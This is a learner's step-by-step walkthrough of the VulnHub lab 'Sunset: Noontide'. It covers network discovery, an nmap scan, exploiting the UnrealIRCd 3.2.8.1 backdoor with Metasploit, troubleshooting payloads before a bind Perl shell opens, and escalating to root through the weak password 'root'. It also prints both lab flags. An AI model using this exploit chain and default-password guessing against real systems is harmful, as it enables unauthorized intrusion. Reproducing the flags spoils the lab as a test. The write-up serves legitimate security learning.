# Sunset: Noontide — Step-by-Step Walkthrough

**Date:** 11 September 2026  
**Platform:** VulnHub  
**Target:** Sunset: Noontide  
**Attacker:** Kali Linux  
**Goal:** Find the local flag, gain root access, and read `/root/proof.txt`.

> **Lab note:** This walkthrough documents my actual path, including the mistakes, confusion, troubleshooting, and the steps I used to clear up the confusion.

---

## 1. Find the target machine

### Command

```bash
sudo netdiscover
```

### What I was doing

Before attacking anything, I needed to find the vulnerable VM on my local network.

`netdiscover` shows devices that are currently visible on the network. I looked through the results and identified:

```text
IP Address: 192.168.29.79
MAC Address: 08:00:27:B8:C1:44
Vendor: PCS Systemtechnik GmbH
```

The VirtualBox-related MAC information helped me identify this as the target VM.

### What I did right

I did not randomly guess an IP. I first discovered the machines on my lab network.

---

# 2. Scan the target

### Command

```bash
nmap -A -sV 192.168.29.79
```

### What I found

The important result was:

```text
6667/tcp open  irc  UnrealIRCd
```

The host was also identified as:

```text
irc.foonet.com
```

### What this means

Port `6667` is commonly used for IRC.

Nmap also told me that the service was **UnrealIRCd**. This was the important clue because the machine was running an old version of UnrealIRCd that was vulnerable to a known backdoor.

So my target information became:

```text
Target IP : 192.168.29.79
Port      : 6667
Service   : IRC
Software  : UnrealIRCd
```

### What I did right

I used Nmap to identify the service instead of immediately trying exploits.

---

# 3. Start Metasploit

### Command

```bash
msfconsole
```

### What I was doing

Metasploit is a framework that contains exploit modules and payloads.

I searched for an UnrealIRCd exploit.

### Command

```text
search UnrealIRCd
```

I found:

```text
exploit/unix/irc/unreal_ircd_3281_backdoor
```

I selected the module.

### Command

```text
use 0
```

Then I checked its settings.

### Command

```text
show options
```

---

# 4. Set the target

### Command

```text
set RHOSTS 192.168.29.79
```

The target's IRC port was already:

```text
RPORT 6667
```

So Metasploit was configured to attack:

```text
192.168.29.79:6667
```

---

# 5. Check if the target is actually vulnerable

### Command

```text
check
```

Metasploit connected to the IRC service and reported that the target appeared vulnerable.

The important part was:

```text
Connected to 192.168.29.79:6667
Trying to register a new IRC user
The target appears to be vulnerable.
UnrealIRCd detected after registration
```

### What this means

This was useful because I wasn't just guessing that the service was vulnerable.

Metasploit actually tested the service and confirmed the vulnerability.

### Simple explanation

Think of it like knocking on a door before trying to open it.

Nmap told me:

> "There is an IRC service here."

Metasploit's `check` told me:

> "This IRC service appears to have the specific vulnerability we are looking for."

---

# 6. First exploitation attempt

The exploit initially had a Meterpreter reverse payload selected:

```text
cmd/linux/http/x86/meterpreter/reverse_tcp
```

I ran:

### Command

```text
exploit
```

Metasploit connected to the target and sent the backdoor command, but ended with:

```text
Exploit completed, but no session was created.
```

### What happened?

This was my first important confusion.

I initially thought:

> "The exploit failed, so maybe the vulnerability isn't working."

But that wasn't necessarily true.

The vulnerability check had already succeeded.

The problem was that the selected payload did not successfully give me a usable session.

### What I did wrong

I initially treated the failed session as if the entire exploit had failed.

### What I learned

There are two separate ideas:

```text
Exploit vulnerability
        +
Payload
        ↓
Usable session
```

The vulnerability can be real while a particular payload still fails.

---

# 7. Confusion about payload names

I tried to change the payload to a reverse shell using paths such as:

```text
set payload payload/cmd/linux/x86/shell_reverse_tcp
```

and:

```text
set payload payload/cmd/linux/x86/shell/reverse_tcp
```

Metasploit rejected these payload names.

### What confused me

I was comparing payload names from different examples/walkthroughs and assuming the exact path would work in my installed Metasploit version.

That was a mistake.

### What I learned

Metasploit payload names have to match the payloads actually available in the current installation/module context.

Instead of inventing or guessing a payload path, I should use:

```text
show payloads
```

and choose from the payloads that Metasploit actually provides.

---

# 8. Try the bind Perl payload

From the available payloads I selected:

### Command

```text
set payload payload/cmd/unix/bind_perl
```

This was accepted.

I then ran:

### Command

```text
exploit
```

Metasploit reported:

```text
Started bind TCP handler against 192.168.29.79:4444
Exploit completed, but no session was created.
```

### What is a bind shell?

A bind shell works differently from a reverse shell.

**Reverse shell:**

```text
Target  ─────────→  Kali
```

The target connects back to my Kali machine.

**Bind shell:**

```text
Kali  ─────────→  Target
```

The target opens a listening port, and Kali connects to that port.

In our case, Metasploit expected a bind shell on:

```text
192.168.29.79:4444
```

---

# 9. Check whether port 4444 was really open

Because Metasploit said it started a bind handler but no session appeared, I checked the target directly.

### Command

```bash
nmap -p 4444 192.168.29.79
```

The result was:

```text
4444/tcp closed
```

### What this told me

The target was **not listening on port 4444 at that moment**.

So the bind payload had not successfully produced the expected shell.

### What I did right

Instead of repeatedly running the same exploit, I tested what was actually happening.

This is a good troubleshooting habit:

> Don't just trust the success-looking message. Verify the result.

---

# 10. Try the generic command payload

I then selected:

### Command

```text
set payload payload/cmd/unix/generic
```

I checked its options:

### Command

```text
show options
```

Metasploit showed:

```text
Payload options (cmd/unix/generic):

Name  Current Setting  Required  Description
CMD                    yes       The command string to execute
```

So this payload needed a command to execute.

I set a simple command:

### Command

```text
set CMD id
```

Then:

### Command

```text
exploit
```

This did not immediately give me a useful session either.

### What I learned

Again, I was getting too focused on changing payloads.

The important thing was to keep testing the actual target behavior rather than randomly trying names from walkthroughs.

---

# 11. The successful exploitation

After continuing with the correct configuration, I eventually obtained the bind shell.

The important output was:

```text
Connected to 192.168.29.79:6667
Trying to register a new IRC user
The target appears to be vulnerable
Sending IRC backdoor command
Started bind TCP handler against 192.168.29.79:4444
Command shell session 1 opened
```

The most important line was:

```text
Command shell session 1 opened
```

### What this means

I finally had command execution on the target.

I was no longer just interacting with the IRC service. I had a shell on the actual Linux machine.

---

# 12. Find out which user I am

### Command

```bash
id
```

I got:

```text
uid=1000(server) gid=1000(server)
groups=1000(server),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
```

Then:

### Command

```bash
whoami
```

Result:

```text
server
```

### What this means

I had successfully entered the machine, but I was **not root**.

My current account was:

```text
server
```

This distinction is important.

Getting a shell is not the same as getting administrator/root privileges.

---

# 13. Find where I am

### Command

```bash
pwd
```

Result:

```text
/home/server/irc/Unreal3.2
```

### What this means

I was inside the UnrealIRCd installation directory.

---

# 14. List the files

### Command

```bash
ls -la
```

This showed many UnrealIRCd files and directories.

During the enumeration I also found a file in the server user's home directory:

```text
/home/server/local.txt
```

---

# 15. Read the local flag

### Command

```bash
cat /home/server/local.txt
```

The result was:

```text
c53c08b5bf2b0801c5d0c24149826a6e
```

### Local flag

```text
c53c08b5bf2b0801c5d0c24149826a6e
```

### What this means

I had confirmed that I had successfully gained user-level access.

---

# 16. Check for sudo privileges

### Command

```bash
sudo -l
```

There was no useful sudo configuration revealed.

### What I learned

I could not simply use `sudo` to become root based on what this check showed.

So I continued looking for another way.

---

# 17. Check SUID binaries

### Command

```bash
find / -perm -4000 -type f 2>/dev/null
```

The results included:

```text
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

### What is SUID?

SUID is a Linux permission that allows a program to run with the privileges of the file owner.

For example, if a root-owned program has SUID, it may run with root privileges.

I checked the list, but there was no obvious unusual SUID binary that immediately gave me root.

---

# 18. The `su root` confusion

This was probably the biggest confusion I had during the machine.

I ran:

### Command

```bash
su root
```

At first I thought:

> "Did this automatically make me root?"

I then ran:

### Command

```bash
whoami
```

and got:

```text
server
```

So I was still `server`.

I tested different inputs.

For example, after:

```text
su root
```

I tried:

```text
root1
```

and remained:

```text
server
```

I also tried:

```text
password123
```

and remained:

```text
server
```

Finally:

```text
su root
```

then entered:

```text
root
```

and checked:

### Command

```bash
whoami
```

Result:

```text
root
```

I also verified with:

### Command

```bash
id
```

Result:

```text
uid=0(root) gid=0(root) groups=0(root)
```

---

# 19. Understanding why `su root` looked confusing

The confusion happened because Linux does **not display password characters** when you enter a password.

So when I ran:

```text
su root
```

the password prompt did not visibly make it obvious what was happening in the transcript.

When I typed:

```text
root
```

that was actually the password being entered.

It was **not** a command that magically changed me to root.

The important discovery was:

```text
Root password = root
```

So the privilege escalation was:

```text
server
   ↓
su root
   ↓
password: root
   ↓
root
```

### Important lesson

`su root` does **not** automatically make every Linux user root.

Normally, `su` requires authentication.

This CTF machine simply had a very weak root password: `root`.

---

# 20. Check the root directory

Once I had confirmed that I was root, I ran:

### Command

```bash
ls -la /root
```

I found:

```text
proof.txt
```

The file was owned by root and had restricted permissions.

Because I was now root, I could read it.

---

# 21. Read the final proof

### Command

```bash
cat /root/proof.txt
```

The contents were:

```text
ab28c8ca8da1b9ffc2d702ac54221105

Thanks for playing! - Felipe Winsnes (@whitecr0wz)
```

### Final proof flag

```text
ab28c8ca8da1b9ffc2d702ac54221105
```

---

# 22. Final Attack Chain

The complete path I followed was:

```text
sudo netdiscover
        ↓
192.168.29.79
        ↓
nmap -A -sV
        ↓
UnrealIRCd on TCP/6667
        ↓
Metasploit
        ↓
unreal_ircd_3281_backdoor
        ↓
Vulnerability confirmed
        ↓
Payload troubleshooting
        ↓
bind_perl
        ↓
Command shell
        ↓
server user
        ↓
/home/server/local.txt
        ↓
Local flag
        ↓
su root
        ↓
Password: root
        ↓
root user
        ↓
/root/proof.txt
        ↓
Final proof flag
```

---

